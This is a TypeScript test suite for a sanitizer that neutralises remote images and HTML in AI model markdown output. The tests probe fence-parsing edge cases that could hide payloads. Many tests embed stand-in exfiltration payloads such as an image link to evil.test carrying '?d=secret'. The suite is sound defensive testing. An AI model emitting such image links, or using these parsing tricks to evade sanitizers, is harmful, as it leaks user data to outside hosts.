import { describe, expect, test } from "bun:test";
import { findLenientFenceCloser, scanFences } from "../src/safety/markdownFences";
import { sanitizeModelMarkdown, sanitizeModelMarkdownDetailed } from "../src/safety/sanitize";
import { prepareModelOutputForWrite } from "../src/safety/writePath";

const lines = (text: string): string[] => text.split("\n");
const spansOf = (text: string): Array<[number, number | null, number, boolean, number]> =>
	scanFences(lines(text)).map((span) => [span.openLine, span.closeLine, span.endLine, span.open, span.containerColumn]);

describe("scanFences: nested list items", () => {
	test("a fence indented to the outer item stays in the outer item after an inner item started", () => {
		// The inner "- " moved the old single-column tracker to column 4, so this fence looked like a top-level one.
		const text = "- outer\n  - inner\n  ```js\n  code\n  ```\n\nafter";
		expect(spansOf(text)).toEqual([[2, 4, 4, false, 2]]);
	});

	test("an unclosed fence in the outer item ends where the outer item ends, not at the inner column", () => {
		const text = "- outer\n  - inner\n  ```js\n  code\n\nplain";
		expect(spansOf(text)).toEqual([[2, null, 4, false, 2]]);
	});

	test("a fence indented into the inner item belongs to the inner item", () => {
		const text = "- outer\n  - inner\n    ```js\n    code\n    ```";
		expect(spansOf(text)).toEqual([[2, 4, 4, false, 4]]);
	});

	test("a marker at a shallower indent closes the items nested deeper", () => {
		const text = "- a\n  - b\n    - c\n- d\n  ```js\n  x\n  ```";
		expect(spansOf(text)).toEqual([[4, 6, 6, false, 2]]);
	});

	test("a flush-left fence after a list is top level", () => {
		const text = "- a\n  - b\n\n```js\nx\n```";
		expect(spansOf(text)).toEqual([[3, 5, 5, false, 0]]);
	});

	test("an over-indented line in an item stays code", () => {
		const text = "- a\n\n      ```js\n      not a fence\n";
		expect(spansOf(text)).toEqual([]);
	});

	test("five spaces after a list marker make what follows indented code, not a fence", () => {
		expect(spansOf("-      ```js\n       code")).toEqual([]);
		expect(spansOf("-    ```js\n     code")).toEqual([[0, null, 1, true, 5]]);
	});

	test("an item inside a quote ends with the quote", () => {
		// The list item is behind a quote marker, so the unquoted line below it is not indented into the item.
		expect(spansOf("> - item\n  ````js\n    `````\n````")).toEqual([[1, 3, 3, false, 0]]);
		expect(spansOf("> - item\n>   ```js\n>   x\n>   ```")).toEqual([[1, 3, 3, false, 2]]);
	});

	test("a lazy continuation line keeps the quote and its item open", () => {
		expect(spansOf("> - item\nlazy text\n> ```js\n> x\n> ```")).toEqual([[2, 4, 4, false, 0]]);
	});

	test("a lazy continuation line does not close the item", () => {
		const text = "- a\nlazy\n  ```js\n  x\n  ```";
		expect(spansOf(text)).toEqual([[2, 4, 4, false, 2]]);
	});
});

describe("findLenientFenceCloser", () => {
	const fence = { marker: "`" as const, length: 3, info: "", language: "", quoteDepth: 0, fenceIndent: 5, containerColumn: 5 };

	test("counts only lines with at most three columns of indentation, whichever way the parser measures it", () => {
		const text = ["x", "    ```", "   ```", "tail"];
		expect(findLenientFenceCloser(text, 0, fence)).toBe(2);
		expect(findLenientFenceCloser(["    ```", "     ```"], 0, fence)).toBe(2);
	});

	test("ignores lines that carry text after the fence characters and other fence characters", () => {
		expect(findLenientFenceCloser(["```js", "~~~", "````"], 0, fence)).toBe(2);
	});
});

describe("sanitizeModelMarkdown: which fences are copied through unread", () => {
	const image = "![x](https://evil.test/a.png?d=secret)";

	test("an indented opener with a closer at column zero no longer swaps which lines are code", () => {
		const text = ` \`\`\`js\nok\n\`\`\`\n\n${image}`;
		expect(sanitizeModelMarkdown(text)).toBe(` \`\`\`js\nok\n\`\`\`\n\n[Remote image: x](https://evil.test/a.png?d=secret)`);
		const written = prepareModelOutputForWrite(text);
		expect(written.findings.map((finding) => finding.kind)).toEqual(["remote-image"]);
		expect(written.text).toContain("[Remote image: x]");
	});

	test("an inline tag line does not swallow the fence opener that follows it", () => {
		const text = `<b>x</b>\n\`\`\`\n\n\`\`\`\n${image}`;
		expect(sanitizeModelMarkdown(text)).toEndWith("[Remote image: x](https://evil.test/a.png?d=secret)");
	});

	test("a fence after a blank line keeps its content, and so does one with three spaces of indent", () => {
		const text = `Intro\n\n   \`\`\`md\n${image}\n   \`\`\`\n\n~~~html\n<img src="https://example.com/a.png">\n~~~\n`;
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("a fence flush with the margin ends a list item or a quote, so its code is left alone", () => {
		const list = `1. Step\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(list)).toBe(list);
		const quote = `> Quoted\n\`\`\`html\n<img src="https://example.com/a.png">\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(quote)).toBe(quote);
	});

	test("an indented fence in the same run of lines as a list item is relabelled but not trusted", () => {
		const text = `- Step\n \`\`\`dataviewjs\nx\n \`\`\`\n${image}`;
		const result = sanitizeModelMarkdown(text);
		expect(result).toContain(" ```text\nx\n ```");
		expect(result).toEndWith("[Remote image: x](https://evil.test/a.png?d=secret)");
		// The code inside is sanitised like the text around it, which costs a cosmetic change at most.
		const code = `- Step\n \`\`\`md\n${image}\n \`\`\``;
		expect(sanitizeModelMarkdown(code)).toBe(`- Step\n \`\`\`md\n[Remote image: x](https://evil.test/a.png?d=secret)\n \`\`\``);
	});

	test("a fence after an HTML line in the same run of lines is not trusted, even when flush with the margin", () => {
		const text = `<span>x</span>\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("a fence whose quoted or listed neighbour was cut short by its container makes later fences untrusted", () => {
		const text = `- \`\`\`js\nx\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("plain text hugging a nested fence's closer from outside makes later fences untrusted", () => {
		const hugged = `- item\n  \`\`\`js\n  x\n  \`\`\`\nplain\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(hugged)).toContain("[Remote image: x]");
		const separated = `- item\n  \`\`\`js\n  x\n  \`\`\`\n\nplain\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(separated)).toBe(separated);
		const nextItem = `- item\n  \`\`\`js\n  x\n  \`\`\`\n- next\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(nextItem)).toBe(nextItem);
	});

	test("a fence straight after a nested fence in the same run of lines is not trusted", () => {
		const text = `- item\n  \`\`\`js\n  x\n  \`\`\`\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("an indented fence after a list is not trusted even across blank lines, but a flush-left one is", () => {
		const indented = `- item\n\n\n \`\`\`md\n${image}\n \`\`\`\n`;
		expect(sanitizeModelMarkdown(indented)).toContain("[Remote image: x]");
		const flush = `- item\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(flush)).toBe(flush);
		const settled = `- item\n\nParagraph.\n\n \`\`\`md\n${image}\n \`\`\`\n`;
		expect(sanitizeModelMarkdown(settled)).toBe(settled);
	});

	test("an HTML block that is still open at the fence means the fence is not copied through", () => {
		const text = `<div>\n\`\`\`md\n${image}\n\`\`\``;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("a comment that starts inside a blank-terminated HTML block runs past its blank line", () => {
		const text = `<b>x</b>\n<!--\n\n\`\`\`md\n${image}\n\`\`\`\n-->\n<style>`;
		const result = sanitizeModelMarkdown(text);
		expect(result).toContain("[Remote image: x]");
		expect(result).toEndWith("&lt;style>");
	});

	test("frontmatter that a renderer might not recognise leaves the fences after it unprotected unless both readings agree", () => {
		const agreed = `---\ntitle: x\n---\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(agreed)).toBe(agreed);
		const disputed = `---\n\`\`\`\n---\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(disputed)).toContain("[Remote image: x]");
	});

	test("a diagram in a list item is judged on its lines with the list's indentation removed and nothing else", () => {
		const nested = "- item\n\n  ```mermaid\n  flowchart TD\n    - A --> B\n  ```";
		expect(sanitizeModelMarkdown(nested)).toBe(nested);
		// "- flowchart TD" is the diagram's first line as the parser hands it over, so it is not a diagram header.
		const marker = "- item\n\n  ```mermaid\n  - flowchart TD\n    A --> B\n  ```";
		expect(sanitizeModelMarkdown(marker)).toContain("  ```text");
		const quoted = "> ```mermaid\n> flowchart TD\n>   A --> B\n> ```";
		expect(sanitizeModelMarkdown(quoted)).toBe(quoted);
	});
});

describe("sanitizeModelMarkdownDetailed: passes", () => {
	test("escaping the first line is not the end of it: the second pass reads the fence that line was hiding", () => {
		const text = "<img src=\"https://evil.test/x\">\n~~~\n\n~~~\n<img src=\"https://evil.test/y\">";
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.text).toBe("&lt;img src=\"https://evil.test/x\">\n~~~\n\n~~~\n&lt;img src=\"https://evil.test/y\">");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["network-html", "network-html"]);
		expect(sanitizeModelMarkdown(result.text)).toBe(result.text);
	});

	test("findings and diagram reports from every pass are kept, each diagram once", () => {
		const text = "<b>x</b>\n<!--\n\n```mermaid\nflowchart TD\n  A@{ img: \"https://evil.test/x.png\" }\n```\n-->\n<style>";
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.mermaid.filter((report) => report.openLine === 3)).toHaveLength(1);
		expect(result.findings.map((finding) => finding.kind).sort()).toEqual(["network-html", "unsafe-diagram"]);
	});

	test("text that is already clean takes one pass and is returned as it was", () => {
		const text = "# Title\n\n```ts\nconst a = 1;\n```\n\n[link](https://example.com)";
		expect(sanitizeModelMarkdownDetailed(text)).toEqual({ text, findings: [], mermaid: [], budgetExhausted: false });
	});

	test("the strict pass reads every line as text, whatever the fences look like", () => {
		const text = "```md\n![x](https://evil.test/a.png)\n```\n\n`$= dv.current()`";
		const result = sanitizeModelMarkdownDetailed(text, { maxPasses: 0 });
		expect(result.text).toContain("[Remote image: x]");
		expect(result.text).toContain(`\`\u200B$= dv.current()\``);
	});

	test("a line with a tab and nothing else does not end a paragraph for code span pairing", () => {
		const image = "![x](https://evil.test/a.png)";
		// A parser that reads the tab line as text pairs the stray backtick with the first one below it.
		const tabbed = `stray \`\n\t\n\`${image}\``;
		expect(sanitizeModelMarkdown(tabbed)).toContain("[Remote image: x]");
		// A line of spaces is blank to every parser, so the span below stands alone and is left as written.
		const spaced = `stray \`\n  \n\`${image}\``;
		expect(sanitizeModelMarkdown(spaced)).toBe(spaced);
	});

	test("a granted exemption survives every pass and is not granted twice", () => {
		const source = "<style>.a { color: red }</style>";
		const text = `<b>x</b>\n<!--\n\n\`\`\`md\nx\n\`\`\`\n-->\n${source}\n${source}`;
		const written = prepareModelOutputForWrite(text, { sourceText: source });
		expect(written.text.match(/<style>/g)?.length).toBe(1);
		expect(written.text).toContain("&lt;style>");
	});
});
